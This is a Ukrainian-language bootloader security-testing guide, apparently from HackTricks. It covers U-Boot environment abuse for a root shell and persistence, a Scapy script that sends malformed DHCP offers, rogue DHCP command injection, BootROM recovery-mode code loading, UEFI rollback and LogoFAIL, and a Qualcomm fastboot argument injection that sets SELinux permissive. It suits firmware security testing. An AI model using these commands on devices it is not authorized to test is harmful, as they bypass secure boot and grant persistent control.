# Тестування bootloader

{{#include ../../banners/hacktricks-training.md}}

Рекомендовано виконати наступні кроки для модифікації конфігурацій запуску пристрою та тестування bootloader'ів таких як U-Boot та UEFI-клас завантажувачі. Зосередьтеся на отриманні раннього виконання коду, оцінці захисту підписом/відкату та зловживанні шляхами відновлення або мережевого завантаження.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Швидкі прийоми U-Boot та зловживання env

1. Отримати доступ до інтерпретаторної оболонки
- Під час завантаження натисніть відому клавішу переривання (часто будь-яку клавішу, 0, пробіл або специфічну для плати "magic" послідовність) перед виконанням `bootcmd`, щоб потрапити в U-Boot prompt.

2. Переглянути стан завантаження та змінні
- Корисні команди:
- `printenv` (дамп environment)
- `bdinfo` (інфо плати, адреси пам'яті)
- `help bootm; help booti; help bootz` (підтримувані методи завантаження ядра)
- `help ext4load; help fatload; help tftpboot` (доступні завантажувачі)

3. Змініть аргументи завантаження, щоб отримати root shell
- Додайте `init=/bin/sh`, щоб kernel відкривав shell замість звичайного init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Мережеве завантаження з вашого TFTP-сервера
- Налаштуйте мережу та отримаєте kernel/FIT образ з LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Зробити зміни постійними через environment
- Якщо сховище env не захищене від запису, ви можете зберегти контроль:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Перевірте змінні типу `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, які впливають на fallback-шляхи. Неправильно налаштовані значення можуть дозволити повторні переривання в shell.

6. Перевірте відладні/небезпечні функції
- Шукайте: `bootdelay` > 0, `autoboot` відключений, необмежений `usb start; fatload usb 0:1 ...`, можливість `loady`/`loads` через serial, `env import` з ненадійних носіїв, а також ядра/ramdisk'и, які завантажуються без перевірки підписів.

7. Тестування образів/перевірки U-Boot
- Якщо платформа заявляє secure/verified boot з FIT образами, спробуйте безпідписані та змінені образи:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або застарілої поведінки `verify=n` часто дозволяє завантажувати довільні payload'и.

## Поверхня мережевого завантаження (DHCP/PXE) та зловмисні сервери

8. Фаззинг параметрів PXE/DHCP
- У старій реалізації BOOTP/DHCP в U-Boot були проблеми з безпекою пам'яті. Наприклад, CVE‑2024‑42040 описує memory disclosure через спеціально сформовані DHCP-відповіді, які можуть leak байти з пам'яті U-Boot назад в мережу. Протестуйте DHCP/PXE код-шляхи з надмірно довгими/крайовими значеннями (option 67 bootfile-name, vendor options, file/servername fields) та спостерігайте зависання/leak'и.
- Мінімальний Scapy-скрипт для навантаження параметрів завантаження:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Також перевірте, чи передаються поля filename PXE до shell/loader логіки без санітизації, коли їх ланцюжать з OS-side provisioning скриптами.

9. Тестування ін’єкції команд через зловмисний DHCP сервер
- Розгорніть зловмисний DHCP/PXE сервіс і спробуйте інжектувати символи в поля filename або options, щоб досягти інтерпретаторів команд на пізніших етапах ланцюжка завантаження. Metasploit’s DHCP auxiliary, `dnsmasq`, або кастомні Scapy-скрипти добре підходять. Переконайтесь, що лабораторна мережа ізольована.

## Режими BootROM відновлення SoC, що обходять нормальне завантаження

Багато SoC мають BootROM "loader" режим, який приймає код по USB/UART навіть коли flash-образи некоректні. Якщо secure-boot fuse-и не випалені, це може дати довільне виконання коду дуже рано в ланцюжку.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Оцініть, чи пристрій має secure-boot eFuses/OTP, які випалені. Якщо ні, режими завантаження BootROM часто обходять вищерівневу верифікацію (U-Boot, kernel, rootfs), виконуючи ваш перший-stage payload безпосередньо з SRAM/DRAM.

## UEFI/PC-клас bootloaders: швидкі перевірки

10. Підміна ESP та тестування відкату
- Змонтуйте EFI System Partition (ESP) і перевірте компоненти завантажувача: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, шляхи vendor logo.
- Спробуйте завантажити з пониженими або відомо вразливими підписаними компонентами boot, якщо revocations Secure Boot (dbx) не актуальні. Якщо платформа все ще довіряє старим shims/bootmanagers, часто можна завантажити свій kernel або `grub.cfg` з ESP для отримання персистенції.

11. Баги парсингу boot logo (клас LogoFAIL)
- Декілька OEM/IBV прошивок були вразливі до помилок парсингу зображень у DXE, які обробляють boot логотипи. Якщо атака має можливість помістити спеціально скрафчене зображення на ESP у вендорно-специфічний шлях (наприклад, `\EFI\<vendor>\logo\*.bmp`) і перезавантажити, може статися виконання коду під час раннього завантаження навіть при увімкненому Secure Boot. Перевірте, чи платформа приймає користувацькі логотипи і чи ці шляхи можна записувати з OS.

## Android/Qualcomm ABL + GBL (Android 16) прогалини довіри

На пристроях Android 16, що використовують Qualcomm's ABL для завантаження Generic Bootloader Library (GBL), перевірте, чи ABL аутентифікує UEFI app, який він завантажує з розділу `efisp`. Якщо ABL лише перевіряє наявність UEFI app і не перевіряє підписи, можливість запису в `efisp` стає pre-OS unsigned code execution під час завантаження.

Практичні перевірки та шляхи зловживання:

- **efisp write primitive**: Потрібен спосіб записати кастомний UEFI app в `efisp` (root/privileged service, баг у OEM app, recovery/fastboot шлях). Без цього розрив при завантаженні GBL не буде доступний.
- **fastboot OEM argument injection** (ABL баг): Деякі збірки приймають додаткові токени в `fastboot oem set-gpu-preemption` і долучають їх до kernel cmdline. Це можна використати для примусового встановлення permissive SELinux, що дозволяє запис у захищені розділи:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Якщо пристрій виправлено, команда має відхиляти додаткові аргументи.
- **Bootloader unlock via persistent flags**: payload на стадії boot може переключити persistent unlock flags (наприклад, `is_unlocked=1`, `is_unlocked_critical=1`), емулюючи `fastboot oem unlock` без сторонніх OEM серверних перевірок. Це стійка зміна після наступного reboot.

Захисні/тріажні нотатки:

- Підтвердіть, чи ABL виконує перевірку підписів для GBL/UEFI payload з `efisp`. Якщо ні, розглядайте `efisp` як високоризикову поверхню для персистенції.
- Відстежуйте, чи виправлені ABL fastboot OEM обробники для валідації кількості аргументів і відхилення додаткових токенів.

## Попередження щодо апаратного забезпечення

Будьте обережні при роботі з SPI/NAND flash під час раннього завантаження (наприклад, замиканням контактов для обходу читань) і завжди консультуйтеся з даташитом флеш-пам'яті. Невчасні замикання можуть пошкодити пристрій або програматор.

## Нотатки та додаткові поради

- Спробуйте `env export -t ${loadaddr}` та `env import -t ${loadaddr}`, щоб перемістити environment blob-и між RAM та сховищем; на деяких платформах дозволено імпортувати env з знімних носіїв без аутентифікації.
- Для персистенції на Linux-системах, що завантажуються через `extlinux.conf`, модифікація рядка `APPEND` (щоб інжектнути `init=/bin/sh` або `rd.break`) часто достатня, якщо перевірки підписів не виконуються.
- Якщо в userland доступні `fw_printenv/fw_setenv`, перевірте, що `/etc/fw_env.config` відповідає реальному розташуванню env. Некоректні офсети дозволяють читати/писати невірний MTD регіон.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
